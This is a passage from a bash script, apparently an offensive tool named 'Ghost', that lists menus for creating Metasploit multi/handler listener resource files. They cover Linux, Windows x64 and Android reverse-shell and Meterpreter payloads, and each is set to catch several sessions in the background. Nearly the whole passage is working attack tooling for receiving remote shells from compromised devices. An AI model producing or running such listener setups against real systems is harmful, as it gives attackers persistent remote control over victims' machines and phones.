echo -e "${White} PAYLOAD  ${Blue}(${lx86ipv6tcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86ipv6tcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

6)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86nonxtcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86nonxtcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

7)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86ppcshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86ppcshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

8)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86shelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86shelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

9)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86armleshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86armleshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

10)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86osxshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86osxshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

11)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86osxppcshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86osxppcshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

12)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86bsdshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86bsdshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

13)
thetargetlinux
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${linuxlhostx})"
echo -e "${White} LPORT    ${Blue}(${linuxlportx})"
echo -e "${White} NAME     ${Blue}(${linuxnamex}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${lx86solarisshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${linuxnamex}.rc)${White}..."
cd $directory/Listeners
touch "$linuxnamex.rc"
echo use exploit/multi/handler >> "$linuxnamex.rc"
echo set PAYLOAD $lx86solarisshelltcp >> "$linuxnamex.rc"
echo set LHOST $linuxlhostx >> "$linuxnamex.rc"
echo set LPORT $linuxlportx >> "$linuxnamex.rc"
echo set ExitOnSession false >> "$linuxnamex.rc"
echo exploit -j >> "$linuxnamex.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$linuxnamex.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

14)
ghostlistener ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}

# Windows create listeners x64
windowsln () {
echo ""
echo -e "${White}              ${Blue}(Windows) (x64)"
echo ""
echo -e "${White} [${Yellow}1${White}] ${wldsm64bingtcp}"
echo -e "${White} [${Yellow}2${White}] ${wldsm64shelltcp}"
echo -e "${White} [${Yellow}3${White}] ${wldsm64tcp}"
echo -e "${White} [${Yellow}4${White}] ${wldsm64tcpdns}"
echo -e "${White} [${Yellow}5${White}] ${wldsm64http}"
echo -e "${White} [${Yellow}6${White}] ${wldsm64https}"
echo -e "${White} [${Yellow}7${White}] ${wldsm64tcpuuid}"
echo -e "${White} [${Yellow}8${White}] ${wldsm64winhttp}"
echo -e "${White} [${Yellow}9${White}] ${wldsm64winhttps}"
echo ""
echo -e "${White} [${Yellow}10${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read wl64listeners

case $wl64listeners in

10)
ghostlistener ;;

1)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64bingtcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64bingtcp >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

2)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64shelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64shelltcp >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

3)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64tcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64tcp >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

4)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64tcpdns})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64tcpdns >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

5)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64http})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64http >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

6)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64https})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64https >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

7)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64tcpuuid})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64tcpuuid >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

8)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64winhttp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64winhttp >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

9)
thewindowstarget
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${wdmlhost})"
echo -e "${White} LPORT    ${Blue}(${wdmport})"
echo -e "${White} NAME     ${Blue}(${wdmname}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${wldsm64winhttps})"
echo ""
echo -e "${White} Creating listener ${Blue}(${wdmname}.rc)${White}..."
cd $directory/Listeners
touch "$wdmname.rc"
echo use exploit/multi/handler >> "$wdmname.rc"
echo set PAYLOAD $wldsm64winhttps >> "$wdmname.rc"
echo set LHOST $wdmlhost >> "$wdmname.rc"
echo set LPORT $wdmport >> "$wdmname.rc"
echo set ExitOnSession false >> "$wdmname.rc"
echo exploit -j >> "$wdmname.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$wdmname.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}


# Android create listeners
androidln () {
echo ""
echo -e "${White}              ${Blue}(Android)"
echo ""
echo -e "${White} [${Yellow}1${White}] ${androidhttps}"
echo -e "${White} [${Yellow}2${White}] ${androidhttp}"
echo -e "${White} [${Yellow}3${White}] ${androidtcp}"
echo -e "${White} [${Yellow}4${White}] ${androidshellhttp}"
echo -e "${White} [${Yellow}5${White}] ${androidshelltcp}"
echo ""
echo -e "${White} [${Yellow}6${White}] Return to main menu"
echo ""
echo -ne "${White} Ghost > ${Yellow}"
read androidnlp

case $androidnlp in

1)
androidquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhdroid})"
echo -e "${White} LPORT    ${Blue}(${lpdroid})"
echo -e "${White} NAME     ${Blue}(${nmdroid}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${androidhttps})"
echo ""
echo -e "${White} Creating listener ${Blue}(${nmdroid}.rc)${White}..."
cd $directory/Listeners
touch "$nmdroid.rc"
echo use exploit/multi/handler >> "$nmdroid.rc"
echo set PAYLOAD $androidhttps >> "$nmdroid.rc"
echo set LHOST $lhdroid >> "$nmdroid.rc"
echo set LPORT $lpdroid >> "$nmdroid.rc"
echo set ExitOnSession false >> "$nmdroid.rc"
echo exploit -j >> "$nmdroid.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$nmdroid.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

2)
androidquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhdroid})"
echo -e "${White} LPORT    ${Blue}(${lpdroid})"
echo -e "${White} NAME     ${Blue}(${nmdroid}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${androidhttp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${nmdroid}.rc)${White}..."
cd $directory/Listeners
touch "$nmdroid.rc"
echo use exploit/multi/handler >> "$nmdroid.rc"
echo set PAYLOAD $androidhttp >> "$nmdroid.rc"
echo set LHOST $lhdroid >> "$nmdroid.rc"
echo set LPORT $lpdroid >> "$nmdroid.rc"
echo set ExitOnSession false >> "$nmdroid.rc"
echo exploit -j >> "$nmdroid.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$nmdroid.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

3)
androidquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhdroid})"
echo -e "${White} LPORT    ${Blue}(${lpdroid})"
echo -e "${White} NAME     ${Blue}(${nmdroid}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${androidtcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${nmdroid}.rc)${White}..."
cd $directory/Listeners
touch "$nmdroid.rc"
echo use exploit/multi/handler >> "$nmdroid.rc"
echo set PAYLOAD $androidtcp >> "$nmdroid.rc"
echo set LHOST $lhdroid >> "$nmdroid.rc"
echo set LPORT $lpdroid >> "$nmdroid.rc"
echo set ExitOnSession false >> "$nmdroid.rc"
echo exploit -j >> "$nmdroid.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$nmdroid.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

4)
androidquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhdroid})"
echo -e "${White} LPORT    ${Blue}(${lpdroid})"
echo -e "${White} NAME     ${Blue}(${nmdroid}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${androidshellhttp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${nmdroid}.rc)${White}..."
cd $directory/Listeners
touch "$nmdroid.rc"
echo use exploit/multi/handler >> "$nmdroid.rc"
echo set PAYLOAD $androidshellhttp >> "$nmdroid.rc"
echo set LHOST $lhdroid >> "$nmdroid.rc"
echo set LPORT $lpdroid >> "$nmdroid.rc"
echo set ExitOnSession false >> "$nmdroid.rc"
echo exploit -j >> "$nmdroid.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$nmdroid.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

5)
androidquest
echo ""
echo -e "${White} DATA     INPUT"
echo ""
echo -e "${White} LHOST    ${Blue}(${lhdroid})"
echo -e "${White} LPORT    ${Blue}(${lpdroid})"
echo -e "${White} NAME     ${Blue}(${nmdroid}.rc)"
echo -e "${White} PAYLOAD  ${Blue}(${androidshelltcp})"
echo ""
echo -e "${White} Creating listener ${Blue}(${nmdroid}.rc)${White}..."
cd $directory/Listeners
touch "$nmdroid.rc"
echo use exploit/multi/handler >> "$nmdroid.rc"
echo set PAYLOAD $androidshelltcp >> "$nmdroid.rc"
echo set LHOST $lhdroid >> "$nmdroid.rc"
echo set LPORT $lpdroid >> "$nmdroid.rc"
echo set ExitOnSession false >> "$nmdroid.rc"
echo exploit -j >> "$nmdroid.rc"
echo ""
echo -e "${White} Ready listener saved in ${Yellow}($directory/Listeners/$nmdroid.rc)"
echo ""
echo -ne "${White} Press any key to continue..."
read
ghostlistener ;;

6)
ghostlistener ;;

* )
echo -e "${White} The option is not valid please choose a number"
sleep 1
ghostlistener ;;
esac
}

# Call menu the script ghost-listeners
reset
ghostlistener
